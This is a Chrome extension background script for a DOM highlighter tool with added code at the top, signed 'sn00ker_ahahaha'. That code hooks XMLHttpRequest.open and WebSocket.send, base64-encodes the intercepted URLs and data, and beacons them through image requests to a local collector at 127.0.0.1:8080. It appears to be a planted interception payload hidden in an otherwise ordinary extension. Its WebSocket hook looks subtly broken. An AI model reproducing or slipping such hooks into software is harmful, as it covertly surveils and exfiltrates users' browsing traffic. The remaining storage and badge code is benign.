function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
/**
 * @desc DOM HIGHLIGHTER
 * @author jiguang
 * @mail jiguang1984#gmail.com
 * @date 2013-11-25
 */

var storage = chrome.storage.local;

// page init
chrome.runtime.onConnect.addListener(function(port) {
    port.onMessage.addListener(function(msg) {
        if (msg.action == "init"){
            storage.get({
                item_list: ''
            }, function(data){

                var item_list = data.item_list;
                setBadge(data);
                port.postMessage({
                    status: "ok",
                    item_list: item_list
                });
            });
        }
    });
});

// popup init
function init(callback){
    storage.get({
        item_list: ''
    }, function(data){
        if (callback && typeof callback == 'function'){
            callback(data);
        }
    });
}

// add item
function add(item, callback){

    storage.get({
        item_list: ''
    }, function(data){

        var item_list = data.item_list;

        if(item_list == ''){
            item_list = [];
        }
        item_list.push(item);

        storage.set({
            item_list: item_list
        }, function(){
            storage.get({
                item_list: ''
            }, function(data){
                setBadge(data);
            });
            postMessage(item, 'add', callback);
        });
    });
}

// remove item
function remove(item, callback){

    storage.get({
        item_list: ''
    }, function(data){

        var item_list = data.item_list;
        for(var i = 0, j = item_list.length; i<j; i++){
            if(item_list[i].selector == item.selector){
                item_list.splice(i, 1);
                break;
            }
        }

        storage.set({
            item_list: item_list
        }, function(){
            postMessage(item, 'remove', callback);
        });
    });

}

// post message to tab
function postMessage(item, action, callback){
    chrome.tabs.query({active:true,windowId: chrome.windows.WINDOW_ID_CURRENT}, function(tab) {
        var port = chrome.tabs.connect(tab[0].id, {name: "dom_highlighter"});
        port.onMessage.addListener(function(data) {
            if (data.status == "ok" && typeof callback == 'function'){
                callback(data);
            }
        });
        port.postMessage({
            action: action,
            selector: item.selector,
            color: item.color
        });
    });
}

// set badge
function setBadge(data){
    var item_list = data.item_list;
    var txt = item_list.length == 0 ? '' : item_list.length + '';

    chrome.browserAction.setBadgeText({
        text: txt
    });
    chrome.browserAction.setBadgeBackgroundColor({
        color: '#16a085'
    });
}







